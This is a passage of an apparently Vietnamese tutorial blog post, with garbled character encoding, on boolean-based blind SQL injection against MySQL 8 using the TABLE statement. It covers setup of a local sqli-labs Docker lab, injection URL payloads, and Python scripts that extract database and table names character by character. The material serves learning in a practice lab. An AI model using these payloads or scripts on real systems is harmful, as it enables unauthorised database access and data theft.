class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                  <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>CÃ¢u lá»‡nh nÃ y á»Ÿ Ä‘Ã¢y pháº§n sáº½ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i viá»‡c so sÃ¡nh chuá»—i thá»© 2 thuá»™c (â€˜defâ€™,â€™mâ€™,3,4,5,6) vá»›i chuá»—i thá»© 2 tá»« information_schema.schemata. VÃ  vá»›i chá»‰ 1 kÃ­ tá»± nÃ³ sáº½ so sÃ¡nh kÃ­ tá»± Ä‘Ã³ vá»›i kÃ­ tá»± Ä‘áº§u cá»§a chuá»—i, á»Ÿ Ä‘Ã¢y lÃ  <code>l vÃ  mysql sáº½ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i so sÃ¡nh l vá»›i m</code>. VÃ  vÃ¬ l&lt;&#x3D;m nÃªn tráº£ vá» true, m&lt;&#x3D;m nÃªn cÅ©ng tráº£ vá» true, vÃ  vá»›i n&gt;m nÃªn tráº£ vá» false. Váº­y vá»›i viá»‡c select vá»›i boolean mÃ  ra giÃ¡ trá»‹ cÃ³ nghÄ©a lÃ  kÃ­ tá»± Ä‘Ã³ váº«n Ä‘ang &lt;&#x3D; kÃ­ tá»± cáº§n tÃ¬m. Rá»“i Ä‘áº¿n khi clause lÃ  false tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i kÃ­ tá»± Ä‘Ã³ lá»›n hÆ¡n kÃ­ tá»± cáº§n tÃ¬m, thÃ¬ ta sáº½ xÃ¡c Ä‘á»‹nh kÃ­ tá»± trÆ°á»›c Ä‘Ã³ lÃ  kÃ­ tá»± chÃºng ta cáº§n tÃ¬m.</p><p>TÆ°Æ¡ng tá»± nhÆ° tháº¿ vÃ  ta sáº½ cÃ³ Ä‘Æ°á»£c tÃªn database Ä‘áº§u tiÃªn.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;ms&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;ms&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;my&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;my&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mz&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mz&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                   <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>Tiáº¿p tá»¥c chÃºng ta sáº½ thay Ä‘á»•i limit clause Ä‘á»ƒ láº¥y tá»«ng database ra.</p><h2 id="Test-truc-tiep-bang-sql-labs"><a href="#Test-truc-tiep-bang-sql-labs" class="headerlink" title="Test trá»±c tiáº¿p báº±ng sql-labs"></a>Test trá»±c tiáº¿p báº±ng sql-labs</h2><h3 id="Xay-dung-moi-truong"><a href="#Xay-dung-moi-truong" class="headerlink" title="XÃ¢y dá»±ng mÃ´i trÆ°á»ng:"></a>XÃ¢y dá»±ng mÃ´i trÆ°á»ng:</h3><p>Äáº§u tiÃªn cÃ¡c báº¡n cáº§n cÃ i Ä‘áº·t docker, khÃ¡ lÃ  dá»… thÃ´i nÃªn cÃ¡c báº¡n tá»± mÃ¬nh cÃ i láº¥y nhÃ©.</p><p>CÃ i Ä‘áº·t sqli-labs:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/c0ny1/vulstudy.git</span><br><span class="line"><span class="built_in">cd</span> vulstudy/sqli-labs</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>Tiáº¿p theo cÃ i Ä‘áº·t Mysql 8:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:lastest</span><br><span class="line">docker run --name mysql -p (Äá»‹a chá»‰ ip cá»§a báº¡n, khÃ´ng cÃ³ dáº¥u ngoáº·c nhÃ©):3306:3306 -e MYSQL_ROOT_PASSWORD=root -d mysql:tag</span><br></pre></td></tr></table></figure><p>Trong terminal gÃµ <code>docker ps</code> Ä‘á»ƒ láº¥y id cá»§a container.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/dockerContainer.png"><br>Tiáº¿p theo thay Ä‘á»•i cáº¥u hÃ¬nh cá»§a sqli-labs:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwn@DESKTOP-AC6UABE:pts/3-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker <span class="built_in">exec</span> -it e70d0c13145d /bin/bash</span><br><span class="line">--------------------</span><br><span class="line">root@e70d0c13145d:/<span class="comment"># ls</span></span><br><span class="line">app   create_mysql_admin_user.sh  home   media  proc  run.sh  start-apache2.sh  tmp</span><br><span class="line">bin   dev                         lib    mnt    root  sbin    start-mysqld.sh   usr</span><br><span class="line">boot  etc                         lib64  opt    run   srv     sys               var</span><br><span class="line">--------------------</span><br><span class="line"><span class="built_in">cd</span> app</span><br><span class="line"><span class="built_in">cd</span> sql-connections</span><br></pre></td></tr></table></figure><p>Tiáº¿p theo sá»­ dá»¥ng vim Ä‘á»ƒ thay Ä‘á»•i ná»™i dung cá»§a file db-creds.inc. HÆ¡i khÃ³ sá»­ dá»¥ng, cÃ¡c báº¡n tá»± Ä‘á»c nhÃ© ^^.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vi db-creds.inc</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//give your mysql connection username n password</span><br><span class="line"><span class="variable">$dbuser</span> =<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> =<span class="string">&#x27;root&#x27;</span>;//Ä‘á»•i theo máº­t kháº©u Ä‘áº·t <span class="built_in">tr</span>Ãªn cÃ¢u lá»‡nh mysql <span class="built_in">tr</span>Ãªn.</span><br><span class="line"><span class="variable">$dbname</span> =<span class="string">&quot;security&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&#x27;172.30.144.1&#x27;</span>;//Ä‘á»•i láº¡i thÃ nh ip nháº­p á»Ÿ cÃ¢u lá»‡nh mysql <span class="built_in">tr</span>Ãªn kia nhÃ©</span><br><span class="line"><span class="variable">$dbname1</span> = <span class="string">&quot;challenges&quot;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>Cáº¥u hÃ¬nh mysql:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwn@DESKTOP-AC6UABE:pts/3-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker <span class="built_in">exec</span> -it e99f25e4be29 /bin/bash</span><br><span class="line">root@e99f25e4be29:/<span class="comment"># mysql -u root -p</span></span><br><span class="line">Enter password: </span><br><span class="line">// Äoáº¡n nÃ y nháº­p mk vÃ o nhÃ©, á»Ÿ Ä‘Ã¢y mÃ¬nh Ä‘áº·t root nÃªn nháº­p root. Náº¿u cÃ¡c báº¡n lÃ m theo mÃ¬nh thÃ¬ cÅ©ng lÃ  root. </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 8</span><br><span class="line">Server version: 8.0.29 MySQL Community Server - GPL</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2022, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt;</span><br><span class="line">Cuá»‘i cÃ¹ng gÃµ:</span><br><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;root&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>Tháº¿ lÃ  Ä‘Ã£ xong. BÃ¢y giá» gÃµ localhost trÃªn trÃ¬nh duyá»‡t lÃ  sáº½ tháº¥y trang web.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/localhost.png"></p><h3 id="Dump-database"><a href="#Dump-database" class="headerlink" title="Dump database:"></a>Dump database:</h3><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/database_test.png"></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/images/post/mysql8/database_test_false.png"></p><p>Váº¿ phÃ­a sau and tráº£ vá» true thÃ¬ trÃªn mÃ n hÃ¬nh sáº½ cÃ³ <code>Your Login name</code> vÃ  <code>Your Password</code>, cÃ²n tráº£ vá» false thÃ¬ sáº½ khÃ´ng xuáº¥t hiá»‡n gÃ¬ cáº£. Tá»« Ä‘Ã¢y chÃºng ta cÃ³ thá»ƒ sá»­ dá»¥ng boolean sqli káº¿t há»£p cÃ¢u lá»‡nh table Ä‘á»ƒ dump ra database.</p><p>ChÃºng ta cáº§n lÆ°u Ã½ vá» kÃ­ tá»± cuá»‘i cÃ¹ng, <code>(&#39;def&#39;,&#39;mysql&#39;,3,4,5,6)</code> sáº½ khÃ´ng báº±ng vá»›i (table information_schema.schemata limit 0,1) nÃªn kÃ­ tá»± cuá»‘i sáº½ dá»«ng á»Ÿ chá»¯ k, chuá»•i bÃ¢y giá» sáº½ lÃ  mysqk vÃ  vá»›i cÃ¡c kÃ­ tá»± nhiá»…u sau nÃ³ sáº½ lÃ  khÃ´ng báº±ng vÃ  sáº½ tiáº¿p tá»¥c cháº¡y. VÃ­ dá»¥ á»Ÿ script dÆ°á»›i sáº½ dá»«ng khi i cháº¡y háº¿t 1 Ä‘áº¿n 20. Khi Ä‘Ã³ chÃºng ta cÃ³ thá»ƒ cho cháº¡y váº­y hoáº·c lá»c cÃ¡i Ä‘Ã³ ra vÃ¬ nÃ³ khÃ´ng áº£nh hÆ°á»Ÿng Ä‘áº¿n káº¿t quáº£(cÃ¡c báº¡n test thÃ¬ sáº½ tháº¥y ^^).</p><p>VÃ­ dá»¥:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--KÃ­ tá»± bÃ¬nh thÆ°á»ng.</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysp&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysp&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysq&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysq&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">--KÃ­ tá»± cuá»‘i:</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysqk&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysqk&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysql&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;def&#x27;</span>,<span class="string">&#x27;mysql&#x27;</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>) <span class="operator">&lt;=</span> (<span class="keyword">table</span> information_schema.schemata limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                                                      <span class="number">0</span> <span class="operator">|</span> <span class="comment">-- Tráº£ vá» false</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Script dump database:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p index kÃ­ tá»± cáº§n tÃ¬m (VD: 1,2,3,...): &quot;</span>)</span><br><span class="line">index_db = <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span>)</span><br><span class="line">db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">        payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,3,4,5,6)&lt;=(table information_schema.schemata limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            db_name+j, index_db)</span><br><span class="line">        <span class="built_in">print</span>(db_name+j)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">        r = requests.get(url=url+payload_encoded)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="comment"># bÆ°á»›c nÃ y mÃ¬nh check khi nÃ³ bá»‹ nhiá»…u á»Ÿ kÃ­ tá»± cuá»‘i</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            db_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># Thay Ä‘á»•i kÃ­ tá»± cuá»‘i vá» Ä‘Ãºng kÃ­ tá»± cáº§n tÃ¬m vÃ­ dá»¥ nÃ³ xuáº¥t ra mysqk thÃ¬ chÃºng ta cáº§n Ä‘á»•i vá» mysql báº±ng cÃ¡ch tÄƒng ascii tháº±ng k lÃªn 1</span></span><br><span class="line">list_dbname = <span class="built_in">list</span>(db_name)</span><br><span class="line">list_dbname[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_dbname[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">db_name = <span class="string">&quot;&quot;</span>.join(list_dbname)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Database name is: &quot;</span>+db_name)</span><br></pre></td></tr></table></figure><h3 id="Dump-table"><a href="#Dump-table" class="headerlink" title="Dump table:"></a>Dump table:</h3><p>TÃ¬m sá»‘ cá»™t cá»§a báº£ng information_schema.tables:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.tables <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">21</span>;</span><br><span class="line">Tráº£ vá» cÃ¡i báº£ng, nhÃ¬u quÃ¡ mÃ¬nh ghi váº­y cho nhanh :P</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">table</span> information_schema.tables <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">22</span>;</span><br><span class="line">ERROR <span class="number">1054</span> (<span class="number">42</span>S22): <span class="literal">Unknown</span> <span class="keyword">column</span> <span class="string">&#x27;22&#x27;</span> <span class="keyword">in</span> <span class="string">&#x27;order clause&#x27;</span></span><br></pre></td></tr></table></figure><p>Váº­y báº£ng nÃ y cÃ³ 21 cá»™t.</p><p>Payload tiáº¿p theo sáº½ cÃ³ dáº¡ng:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/Less-1/?id=1&#x27; and(&#x27;def&#x27;,&#x27;mysql&#x27;,&#x27;a&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit  0,1)-- -</span><br></pre></td></tr></table></figure><p>á» Ä‘Ã¢y, Ã´ Ä‘áº§u tiÃªn lÃ  def, Ã´ thá»© 2 lÃ  database cáº§n tÃ¬m table, Ã´ thá»© 3 lÃ  table. CÃ¡c Ã´ sau lÃ  khÃ´ng quan trá»ng. Tuy nhiÃªn chÃºng ta cáº§n pháº£i limit table Ä‘Ãºng vá»›i tá»«ng database. KhÃ´ng cÃ³ má»™t cÃ¡ch tÃ¬m cá»¥ thá»ƒ, nÃªn viá»‡c test khoáº£ng tÃ¬m lÃ  cáº§n thiáº¿t.</p><p>ÄÃ¢y lÃ  source cho viá»‡c dump table_name cá»§a mysql</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line">table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">all_table_name = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_table <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span 